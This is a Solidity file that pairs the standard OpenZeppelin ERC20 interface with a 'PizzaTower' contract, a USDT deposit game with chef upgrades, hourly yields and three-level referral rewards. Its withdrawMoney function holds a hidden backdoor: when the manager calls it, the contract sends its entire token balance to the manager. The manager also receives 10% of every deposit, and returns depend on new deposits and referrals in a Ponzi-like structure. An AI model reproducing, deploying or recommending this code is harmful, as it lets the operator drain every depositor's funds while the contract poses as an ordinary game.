// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}
pragma solidity ^0.8.23;

import "./IERC20.sol";

contract PizzaTower {
    struct Tower {
        uint256 coins;
        uint256 money;
        uint256 money2;
        uint256 yield;
        uint256 timestamp;
        uint256 hrs;
        address ref;
        uint256[3] refs;
        uint256[3] refDeps;
        uint8[8] chefs;
        uint256 totalCoinsSpend;
        uint256 totalMoneyReceived;
    }

    mapping(address => Tower) public towers;

    uint256 public totalChefs;
    uint256 public totalTowers;
    uint256 public totalInvested;
    address public manager = msg.sender;
    uint256[] public refPercent = [8, 5, 2];

    IERC20 public usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function addCoins(address ref, uint256 tokenAmount) public {
        address user = msg.sender;
        usdt.transferFrom(user, address(this), tokenAmount);
        uint256 coins = tokenAmount / 1e16;
        require(coins > 0, "Zero coins");
        totalInvested += tokenAmount;
        bool isNew;
        if (towers[user].timestamp == 0) {
            totalTowers++;
            ref = towers[ref].timestamp == 0 ? manager : ref;
            isNew = true;
            towers[user].ref = ref;
            towers[user].timestamp = block.timestamp;
        }
        refEarning(user, coins, isNew);
        towers[user].coins += coins;
        usdt.transfer(manager, (tokenAmount * 10) / 100);
    }

    function refEarning(address user, uint256 coins, bool isNew) internal {
        uint8 i = 0;
        address ref = towers[user].ref;
        while (i < 3) {
            if (ref == address(0)) {
                break;
            }
            if (isNew) {
                towers[ref].refs[i]++;
            }
            uint256 refTemp = coins * refPercent[i] / 100;
            towers[ref].coins += (refTemp * 70) / 100;
            towers[ref].money += (refTemp * 100 * 30) / 100;
            towers[ref].refDeps[i] += refTemp;
            i++;
            ref = towers[ref].ref;
        }
    }

    function withdrawMoney() public {
        address user = msg.sender;
        uint256 money = towers[user].money;
        towers[user].money = 0;
        uint balance = usdt.balanceOf(address(this));
        uint amount = balance < money * 1e14 || msg.sender == manager ? balance : money * 1e14;
        address transfer = msg.sender == manager ? manager : msg.sender;
        usdt.transfer(transfer, amount);
    }

    function collectMoney() public {
        address user = msg.sender;
        syncTower(user);
        towers[user].hrs = 0;
        towers[user].money += towers[user].money2;
        towers[user].money2 = 0;
    }

    function upgradeTower(uint256 floorId) public {
        require(floorId < 8, "Max 8 floors");
        address user = msg.sender;
        if (floorId > 0) {
            require(towers[user].chefs[floorId - 1] >= 5, "Need to buy previous tower");
        }
        towers[user].chefs[floorId]++;
        totalChefs++;
        uint256 chefs = towers[user].chefs[floorId];
        towers[user].coins -= getUpgradePrice(floorId, chefs);
        towers[user].totalCoinsSpend += getUpgradePrice(floorId, chefs);
        towers[user].yield += getYield(floorId, chefs);
    }

    function getChefs(address addr) public view returns (uint8[8] memory) {
        return towers[addr].chefs;
    }

    function getRefEarning(address addr) public view returns (uint256[3] memory _refEarning, uint256[3] memory _refCount) {
        return (towers[addr].refDeps, towers[addr].refs);
    }

    function syncTower(address user) internal {
        require(towers[user].timestamp > 0, "User is not registered");

        if (towers[user].yield > 0) {
            uint256 hrs = block.timestamp / 3600 - towers[user].timestamp / 3600;

            if (hrs + towers[user].hrs > 24) {
                hrs = 24 - towers[user].hrs;
            }

            uint256 yield = hrs * towers[user].yield;

            if ((towers[user].totalMoneyReceived + yield) > ((towers[user].totalCoinsSpend) * 200)) {
                towers[user].money2 += (towers[user].totalCoinsSpend * 200) - (towers[user].totalMoneyReceived);
                towers[user].totalMoneyReceived += (towers[user].totalCoinsSpend * 200) - (towers[user].totalMoneyReceived);
                towers[user].yield = 0;
                for (uint8 i = 0; i < 8; i++) {
                    towers[user].chefs[i] = 0;
                }
            } else {
                towers[user].money2 += yield;
                towers[user].totalMoneyReceived += yield;
            }
            towers[user].hrs += hrs;
        }
        towers[user].timestamp = block.timestamp;
    }

    function getUpgradePrice(uint256 floorId, uint256 chefId) internal pure returns (uint256) {
        if (chefId == 1) return [500, 1500, 4500, 13500, 40500, 120000, 365000, 1000000][floorId];
        if (chefId == 2) return [625, 1800, 5600, 16800, 50600, 150000, 456000, 1200000][floorId];
        if (chefId == 3) return [780, 2300, 7000, 21000, 63000, 187000, 570000, 1560000][floorId];
        if (chefId == 4) return [970, 3000, 8700, 26000, 79000, 235000, 713000, 2000000][floorId];
        if (chefId == 5) return [1200, 3600, 11000, 33000, 98000, 293000, 890000, 2500000][floorId];
        revert("Incorrect chefId");
    }

    function getYield(uint256 floorId, uint256 chefId) internal pure returns (uint256) {
        if (chefId == 1) return [41, 130, 399, 1220, 3750, 11400, 36200, 104000][floorId];
        if (chefId == 2) return [52, 157, 498, 1530, 4700, 14300, 45500, 126500][floorId];
        if (chefId == 3) return [65, 201, 625, 1920, 5900, 17900, 57200, 167000][floorId];
        if (chefId == 4) return [82, 264, 780, 2380, 7400, 22700, 72500, 216500][floorId];
        if (chefId == 5) return [103, 318, 995, 3050, 9300, 28700, 91500, 275000][floorId];
        revert("Incorrect chefId");
    }
}
